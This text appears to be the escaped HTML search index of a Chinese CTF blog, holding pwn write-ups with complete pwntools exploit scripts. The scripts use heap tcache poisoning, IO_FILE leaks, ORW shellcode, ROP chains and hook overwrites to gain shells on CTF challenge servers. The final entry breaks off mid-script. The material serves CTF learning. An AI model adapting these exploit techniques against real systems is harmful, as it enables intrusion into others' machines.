          &lt;p&gt;与上一篇文章一样的打法，注意此次没有单独清空&lt;code&gt;realloc_ptr&lt;/code&gt;的函数，因此在分配堆块上需注意，避免出现&lt;code&gt;double free corruption&lt;/code&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
context(log_level=&#39;debug&#39;)

def pwn():
    elf=ELF(&amp;quot;./TWCTF_online_2019_asterisk_alloc&amp;quot;)
    libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

    def malloc(s,cc):
        io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
        io.sendafter(b&amp;quot;Data: &amp;quot;,cc)
        
    def calloc(s,cc):
        io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;2&amp;quot;)
        io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
        io.sendafter(b&amp;quot;Data: &amp;quot;,cc)
        
    def realloc(s,cc):
        io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;3&amp;quot;)
        io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
        io.sendafter(b&amp;quot;Data: &amp;quot;,cc)
        
    def delete(n):
        io.sendlineafter(b&amp;quot;Your &amp;quot;,b&amp;quot;4&amp;quot;)
        io.sendlineafter(b&amp;quot;Which: &amp;quot;,n)

    # gdb.attach(io)
    # pause()

    realloc(0x100,b&amp;quot;aaa&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x10,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x100,b&amp;quot;aaa&amp;quot;)
    realloc(0x60,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;eee&amp;quot;)

    for i in range(7):
        delete(b&amp;quot;r&amp;quot;)
        
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x60,b&amp;quot;ttt&amp;quot;)
    realloc(0x100,cyclic(0x68)+p64(0x91)+b&amp;quot;\x60\xc7&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;eee&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    payload=p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;
    malloc(0x90,payload) #此处使用malloc分配
    # realloc(0,b&amp;quot;&amp;quot;)

    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1c80-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
    print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
    malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
    free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
    sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
    one_gadget=[0x4f2c5,0x4f322,0x10a38c]
    shell=leak_addr+one_gadget[1]

    realloc(0x100,b&amp;quot;aaa&amp;quot;)
    realloc(0x60,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;www&amp;quot;)

    for i in range(2):
        delete(b&amp;quot;r&amp;quot;)

    realloc(0,b&amp;quot;&amp;quot;)
    # delete(b&amp;quot;r&amp;quot;)
    realloc(0x60,b&amp;quot;qqq&amp;quot;)
    realloc(0x100,cyclic(0x68)+p64(0x91)+p64(free_hook))
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,p64(sys_addr))
    # realloc(0,b&amp;quot;&amp;quot;)

    calloc(0x10,b&amp;quot;/bin/sh\x00&amp;quot;)
    delete(b&amp;quot;c&amp;quot;)
    # delete(b&amp;quot;m&amp;quot;)

    io.interactive()
    
while True:
    try:
        io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26672)
        # io=process(&amp;quot;./TWCTF_online_2019_asterisk_alloc&amp;quot;)
        pwn()
    
    except:
        io.close()
        continue
~~&lt;/code&gt;&lt;/pre&gt;
">TWCTF_online_2019_asterisk_alloc wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/IvtYDXMcd/"" data-c="
          &lt;p&gt;这题考察realloc分配内存和io leak，glibc 2.27，可以打tcache dup和tcache posioning，劫持free_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;当ptr == nullptr的时候，相当于malloc(size)， 返回分配到的地址
当ptr != nullptr &amp;amp;&amp;amp; size == 0的时候，相当于free(ptr)，返回空指针
当size小于原来ptr所指向的内存的大小时，直接缩小，返回ptr指针。被削减的那块内存会被释放，放入对应的bins中去
当size大于原来ptr所指向的内存的大小时，如果原ptr所指向的chunk后面又足够的空间，那么直接在后面扩容，返回ptr指针；如果后面空间不足，先释放ptr所申请的内存，然后试图分配size大小的内存，返回分配后的指针
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;利用以上性质可知每次分配完之后需要再分配一次并且是&lt;code&gt;ptr=null&lt;/code&gt;才可以更新分配的地址，利用size变化可以越界修改tcache的&lt;code&gt;fd&lt;/code&gt;指针&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
context(log_level=&#39;debug&#39;)

def pwn():
    io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28342)
        # io=process(&amp;quot;./roarctf_2019_realloc_magic&amp;quot;)
    elf=ELF(&amp;quot;./roarctf_2019_realloc_magic&amp;quot;)
    libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
    def add(s,cc):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendlineafter(b&amp;quot;Size?\n&amp;quot;,str(s))
        io.sendafter(b&amp;quot;Content?\n&amp;quot;,cc)

    def delete():
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)

    def cl():
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;666&amp;quot;)

    # gdb.attach(io)
    # pause()

    add(0x100,b&amp;quot;qwe&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x10,b&amp;quot;aaa&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x100,b&amp;quot;qwe&amp;quot;)

    add(0x60,b&amp;quot;qqq&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;qqq&amp;quot;)

    for i in range(7):
        delete()

    add(0,b&amp;quot;&amp;quot;)

    add(0x60,b&amp;quot;qqq&amp;quot;)

    add(0x100,cyclic(0x68)+p64(0x91)+b&amp;quot;\x60\xc7&amp;quot;) #修改0xa1为0x91，防止其free后回到原tcache导致后续申请出问题
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;aaa&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;)
    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1c80-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
    print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
    one_gadget=[0x4f2c5,0x4f322,0x10a38c]
    shell=one_gadget[1]+leak_addr
    malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
    free_hook=libc.sym[b&amp;quot;__free_hook&amp;quot;]+leak_addr
    sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+leak_addr

    cl()

    add(0x100,b&amp;quot;ppp&amp;quot;)

    add(0x60,b&amp;quot;qqq&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;www&amp;quot;)

    for i in range(2):
        delete()

    add(0,b&amp;quot;&amp;quot;)

    add(0x60,b&amp;quot;a&amp;quot;)

    add(0x100,cyclic(0x68)+p64(0x81)+p64(free_hook-0x8))
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;/bin/sh\x00&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;/bin/sh\x00&amp;quot;+p64(sys_addr))
    # add(0,b&amp;quot;&amp;quot;)
    delete()
    # io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    # io.sendlineafter(b&amp;quot;Size?\n&amp;quot;,b&amp;quot;1&amp;quot;)


    io.interactive()

while True:
    try:
        pwn()
    except:
        io.close()
        continue

# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">roarctf_2019_realloc_magic</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/mqKBma3Sl/"" data-c="
          &lt;p&gt;seccomp dump发现本题禁用&lt;code&gt;execve()&lt;/code&gt;系统调用，故考虑打orw，程序一开始开辟一段可写可执行段，且存在函数&lt;code&gt;jmp_rsp&lt;/code&gt;，可以将其填充至ret地址控制程序执行流&lt;br&gt;
注意构造read的shellcode时系统调用，&lt;code&gt;rax=0&lt;/code&gt;&lt;br&gt;
&lt;s&gt;不然就是无尽的debug&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25349)
# io=process(&amp;quot;./bad&amp;quot;)
elf=ELF(&amp;quot;./bad&amp;quot;)

jmp_rsp=0x400a01

jmp_shellcode=asm(&#39;&#39;&#39;
sub rsp,0x30
jmp rsp
&#39;&#39;&#39;)

orw_shellcode=asm(&#39;&#39;&#39;
  push   0x67616c66
  push   0x2
  pop    rax
  mov    rdi,rsp
  xor    rsi,rsi
  syscall 

  mov    rdi,rax
  xor    rax,rax
  mov    rsi,0x123500
  push   0x50
  pop    rdx
  syscall 

  push   0x1
  pop    rax
  xor rdi,rdi
  mov    rsi,0x123500
  push   0x50
  pop    rdx
  syscall
&#39;&#39;&#39;)

read_shellcode=asm(&#39;&#39;&#39;
    xor rax,rax
    mov edi,0
    push 0x123000
    pop rsi
    push 0x100
    pop rdx
    syscall              
&#39;&#39;&#39;)

call_shellcode=asm(&#39;&#39;&#39;
mov rax,0x123000            
call rax
&#39;&#39;&#39;)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;fun!\n&amp;quot;)
payload=read_shellcode+call_shellcode
payload=payload.ljust(0x28,b&amp;quot;a&amp;quot;)+p64(jmp_rsp)+jmp_shellcode
io.send(payload)


io.recvuntil(b&amp;quot;d!\n&amp;quot;)
payload=orw_shellcode
# payload=asm(shellcraft.open(&amp;quot;./flag&amp;quot;)+shellcraft.read(3,0x123500,0x100)+shellcraft.write(1,0x123500,0x100))
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[极客大挑战 2019]Not Bad wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/0AqzRuE5E/"" data-c="
          &lt;p&gt;泄露libc+&lt;code&gt;__environ&lt;/code&gt;泄露栈地址打orw&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28492)
# io=process(&amp;quot;./intorw&amp;quot;)
elf=ELF(&amp;quot;./intorw&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

pop_rdi=next(elf.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
ret=0x400726

def pre():
    io.sendlineafter(b&amp;quot;read\n&amp;quot;,b&amp;quot;-1&amp;quot;)
    io.recvuntil(b&amp;quot;read:\n&amp;quot;)


pre()
payload=cyclic(0x28)+p64(pop_rdi)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4009c4)
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
pop_rsi=leak_addr+0x2be51 
pop_rdx_r12=leak_addr+0x11f497
pop_rax=leak_addr+0x45eb0
syscall_ret=leak_addr+0x091396

# gdb.attach(io)
# pause()

pre()
payload=cyclic(0x28)+p64(pop_rdi)+p64(environ)+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4009c4)
io.send(payload)
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

# gdb.attach(io)
# pause()

#open
orw=p64(pop_rdi)+p64(stack_addr-0x48)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x601300)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x601300)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(write_a)


pre()

payload=cyclic(0x28)+orw+b&amp;quot;./flag\x00\x00&amp;quot;
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK2]intorw wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/k-TWvtUVK/"" data-c="
          &lt;h3 id=&#34;pwn_1&#34;&gt;PWN_1:&lt;/h3&gt;
&lt;p&gt;IO_FILE_plus各种偏移：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
//IO_FILE_complete
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入负数溢出&lt;code&gt;(A0-20)/8&lt;/code&gt;（qword 8bytes）可以反向溢出至&lt;code&gt;stdout&lt;/code&gt;指针处，可以借此控制&lt;code&gt;_IO_2_1_stdout&lt;/code&gt;结构体，进而修改结构体中成员，修改&lt;code&gt;_flags&lt;/code&gt;为&lt;code&gt;/bin/sh\x00&lt;/code&gt;字符串&lt;br&gt;
&lt;code&gt;vtable&lt;/code&gt;为&lt;code&gt;&amp;amp;_IO_2_1_stdout+0x10&lt;/code&gt;&lt;br&gt;
&lt;code&gt;_IO_save_base&lt;/code&gt;为&lt;code&gt;system&lt;/code&gt;地址&lt;br&gt;
&lt;code&gt;_lock&lt;/code&gt;(&amp;amp;_IO_2_1_stdout+0x88处)值保持不变（固定偏移）&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685446603675.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;puts-&amp;gt;vtable-&amp;gt;_IO_2_1_stdout+0x10(原 _IO_new_file_xsputn偏移为0x38，修改后实际调用+0x48,即_IO_save_base)-&amp;gt;system(_IO_save_base)&amp;lt;-&amp;quot;/bin/sh\x00&amp;quot;(原_flags字段做参数)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.23有效，以上无效&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./nsctf_online_2019_pwn1&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;, 27333)
elf=ELF(&amp;quot;./nsctf_online_2019_pwn1&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendafter(b&amp;quot;index:\n&amp;quot;,str(n))
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

add(0x100,b&amp;quot;aaa&amp;quot;)

payload=p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;
edit(-0x10,len(payload),payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
libc_base=leak_addr-libc.sym[b&amp;quot;_IO_file_jumps&amp;quot;]
print(&amp;quot;libc_base: &amp;quot;+hex(libc_base))

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
shell=one_gadget[1]+libc_base
sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+libc_base
_IO_2_1_stdout=leak_addr+0x1f40


fs=FileStructure()
fs.flags=b&amp;quot;/bin/sh\x00&amp;quot;
fs.vtable=p64(_IO_2_1_stdout+0x10)
fs._IO_save_base=p64(sys_addr)
fs._lock=p64(libc_base+0x3c6780)


edit(-0x10,len(fs),bytes(fs))

io.interactive()

# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_2&#34;&gt;PWN_2:&lt;/h3&gt;
&lt;p&gt;一道fastbin attack打one_gadget,&lt;code&gt;realloc&lt;/code&gt;调偏移&lt;br&gt;
delete操作每次指针置空，但是有update函数off by one可以修改指针低位，可以指向任意堆块进行操作&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29081)
# io=process(&amp;quot;./nsctf_online_2019_pwn2&amp;quot;)
elf=ELF(&amp;quot;./nsctf_online_2019_pwn2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def pre(cc):
    io.recvuntil(b&amp;quot;name\n&amp;quot;)
    io.send(cc)
    
def add(s):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size\n&amp;quot;,str(s))
    
def delete():
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;2&amp;quot;)

def show():
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;3&amp;quot;)
        
def update(cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;4&amp;quot;)
    io.sendafter(b&amp;quot;name\n&amp;quot;,cc)
    
def edit(cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;5&amp;quot;)
    io.sendafter(b&amp;quot;note\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

pre(cyclic(0x30))

add(0x90)
add(0x30)
update(cyclic(0x30)+b&amp;quot;\x10&amp;quot;)
delete()

add(0x20)
# edit(cyclic(0x18)+p64(0x10))
update(cyclic(0x30)+b&amp;quot;\x40&amp;quot;)

show()
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
realloc=libc.sym[b&amp;quot;__libc_realloc&amp;quot;]+leak_addr
malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
shell=one_gadget[1]+leak_addr

add(0x60)
delete()

add(0x10)
update(cyclic(0x30)+b&amp;quot;\x40&amp;quot;)
edit(p64(malloc_hook-0x23))

add(0x60)
add(0x60)
edit(cyclic(0xb)+p64(shell)+p64(realloc+0x10))

# gdb.attach(io)
# pause()

add(0x10)
# add(0x10)
    
io.interactive()

# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">nsctf_online_2019_pwn_1&2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/n_AKurXjc/"" data-c="
          &lt;p&gt;程序运行流程：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685368754887.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
调用&lt;code&gt;exit()&lt;/code&gt;函数的流程：&lt;br&gt;
&lt;code&gt;exit()-&amp;gt;_dl_fini()-&amp;gt;_rtld_global-&amp;gt;_rtld_global._rtld_lock_recursive-&amp;gt;_rtld_global._rtld_unlock_recursive&lt;/code&gt;&lt;br&gt;
其中&lt;code&gt;_rtld_global._rtld_lock_recursive-&lt;/code&gt;和&lt;code&gt;_rtld_global._rtld_unlock_recursive&lt;/code&gt;就是所说的&lt;code&gt;exit_hook&lt;/code&gt;&lt;br&gt;
此题可以任意地址写5次，每次写1字节，开头泄露&lt;code&gt;sleep()&lt;/code&gt;函数地址，可以据此算出libc基址，而&lt;code&gt;_rtld_global&lt;/code&gt;在ld上，所以根据偏移求出ld基址，通过偏移求出&lt;code&gt;exit_hook&lt;/code&gt;地址&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685369489489.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685369494078.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
最后将one_gadget写入&lt;code&gt;exit_hook&lt;/code&gt;即可&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29187)
# io=process(&amp;quot;./the_end&amp;quot;)
elf=ELF(&amp;quot;./the_end&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
ld=ELF(&amp;quot;./ld-2.27.so&amp;quot;)

def ss(c,cc):
    io.send(c)
    io.send(cc)

io.recvuntil(b&amp;quot;gift &amp;quot;)
leak_addr=int(io.recv(14),16)
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
libc_base=leak_addr-libc.sym[b&amp;quot;sleep&amp;quot;]
print(&amp;quot;libc_base: &amp;quot;+hex(libc_base))
ld_base=libc_base+0x3f1000
io.recvuntil(b&amp;quot;;)\n&amp;quot;)

_rtld_global=ld_base+ld.sym[b&amp;quot;_rtld_global&amp;quot;]
__rtld_lock_unlock_recursive=_rtld_global+0xf08
print(&amp;quot;_rtld_global: &amp;quot;+hex(_rtld_global))
print(&amp;quot;__rtld_lock_unlock_recursive: &amp;quot;+hex(__rtld_lock_unlock_recursive))

# one_gadget=[0x4f365,0x4f3c2,0x10a45c]
one_gadget=[0x4f2c5,0x4f322,0x10a38c]
shell=one_gadget[1]+libc_base
print(&amp;quot;shell: &amp;quot;,hex(shell))

for i in range(5):
    ss(p64(__rtld_lock_unlock_recursive+i),p64(shell)[i:i+1])

io.sendline(b&amp;quot;exec 1&amp;gt;&amp;amp;0&amp;quot;)
io.sendline(b&amp;quot;cat flag&amp;quot;)

io.interactive()

# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">hctf2018_the_end wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/wOZrtuJ_Q1/"" data-c="
          &lt;p&gt;&lt;s&gt;全栈✌太多辣&lt;/s&gt;&lt;br&gt;
按照附件编号：&lt;/p&gt;
&lt;h4 id=&#34;attachment-11makewishes&#34;&gt;attachment-11：(makewishes)&lt;/h4&gt;
&lt;p&gt;伪随机+canary保护的ret2text&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10001)
# io=process(&amp;quot;./makewishes&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)


# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;first wish\n&amp;quot;)
payload=cyclic(0xe)+p64(0)
io.send(payload)
cs.srand(0)

io.recvuntil(b&amp;quot;number!\n&amp;quot;)
io.sendline(str(cs.rand()%9+1))

io.recvuntil(b&amp;quot;second wish!\n&amp;quot;)
payload=b&amp;quot;%11$p&amp;quot;
io.sendline(payload)
canary=int(io.recv(18),16)
print(&amp;quot;canary:  &amp;quot;+hex(canary))

cs.srand(0)

io.recvuntil(b&amp;quot;number!\n&amp;quot;)
io.sendline(str(cs.rand()%9+1))

io.recvuntil(b&amp;quot;final wish!\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+p64(0x4011d6)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-12login&#34;&gt;attachment-12：(Login)&lt;/h4&gt;
&lt;p&gt;签到题，ret2libc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
